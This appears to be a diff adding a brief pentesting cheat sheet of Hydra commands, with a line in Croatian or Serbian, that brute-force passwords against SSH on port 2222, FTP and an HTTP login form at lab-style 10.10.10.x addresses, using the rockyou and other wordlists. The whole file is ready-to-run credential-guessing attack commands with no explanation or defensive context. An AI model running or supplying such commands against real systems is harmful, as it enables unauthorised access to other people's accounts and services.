@@ -1,0 +1,8 @@
+SSH
+hydra -l user -P /usr/share/wordlists/rockyou.txt -s 2222 10.10.10.10 ssh
+
+FTP isto i za mysql,rdp,...
+hydra -l admin -P passwords.txt ftp://10.10.10.20
+
+HTTP login form
+hydra -l admin -P rockyou.txt 10.10.10.30 http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"
